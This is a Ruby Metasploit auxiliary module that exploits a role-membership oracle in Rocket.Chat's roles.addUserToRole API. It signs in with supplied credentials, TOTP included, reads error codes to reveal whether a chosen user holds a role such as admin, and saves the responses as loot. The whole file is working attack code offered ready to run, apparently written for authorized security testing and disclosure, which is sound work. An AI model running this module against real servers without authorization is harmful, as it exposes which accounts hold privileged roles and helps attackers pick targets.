class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat roles.addUserToRole membership oracle probe (VULN-020)',
        'Description' => %q{
          Rocket.Chat's POST /api/v1/roles.addUserToRole returns
          error-user-already-in-role before the permission check, an oracle that
          reveals any user's roles to any account. This module signs in with the
          operator's credentials and reads whether PROBEUSER holds ROLEID (globally,
          or in ROOMID when set) from the error code, without changing any assignment:
          adding a user to a role they already hold is a no-op and the answer precedes
          any write. The operator sets the role and users to probe.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/roles.addUserToRole']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('ROLEID', [true, 'The role to probe membership of', 'admin']),
      OptString.new('PROBEUSER', [true, 'A username believed to hold ROLEID (the positive probe)', 'admin']),
      OptString.new('CONTROLUSER', [true, 'A username believed NOT to hold ROLEID (the negative probe)', 'bob']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run
    unless authenticate
      fail_with(Failure::NoAccess, 'Could not sign in with the credentials given.')
    end

    res = probe_role(datastore['PROBEUSER'])
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = role_answer(res).include?('error-user-already-in-role') && role_answer(probe_role(datastore['CONTROLUSER'])).include?('error-action-not-allowed')
    fail_with(Failure::NotVulnerable, 'VULN-020: the attack did not land') unless hit

    print_good("#{peer} - VULN-020: exploited")
    print_good("#{peer} - oracle confirmed: '#{datastore['PROBEUSER']}' holds role '#{datastore['ROLEID']}', '#{datastore['CONTROLUSER']}' does not")
    print_status("  #{datastore['PROBEUSER']} -> #{role_answer(res)}")
    print_status("  #{datastore['CONTROLUSER']} -> #{role_answer(probe_role(datastore['CONTROLUSER']))}")
    path = store_loot('blue_spider.vuln_020', 'text/plain', rhost, res.body.to_s, 'vuln_020.txt', 'VULN-020 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-020 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def probe_role(u)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id },
      'data' => { "roleId" => datastore['ROLEID'], "username" => u }.to_json
    })
  end

  def role_answer(res)
    api_error(res)
  end
end
